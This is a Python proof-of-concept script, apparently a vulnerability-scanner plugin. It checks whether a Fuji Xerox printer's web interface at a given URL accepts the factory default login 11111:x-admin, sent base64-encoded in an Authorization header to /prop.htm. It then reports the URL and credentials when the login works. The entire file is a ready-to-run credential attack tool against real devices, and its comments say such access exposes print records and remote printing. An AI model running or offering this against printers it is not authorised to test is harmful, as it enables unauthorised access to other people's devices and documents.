#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 富士施乐打印机默认口令漏洞
referer: http://www.wooyun.org/bugs/WooYun-2016-196214
author: Lucifer
description: 默认配置不当/可远程查看打印记录并打印文件,可以通过Port9100和FTP服务进行打印。
'''
import sys
import requests


class printer_xerox_default_pwd_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "Authorization":"Basic MTExMTE6eC1hZG1pbg==",
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/prop.htm"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"prconprhttp" in req.text and r"Fuji Xerox" in req.text:
                return "[+]存在富士施乐打印机默认口令漏洞...(高危)\tpayload: "+vulnurl+"\t11111:x-admin"
            else:
                return "[-]no vuln"

        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = printer_xerox_default_pwd_BaseVerify(sys.argv[1])
    testVuln.run()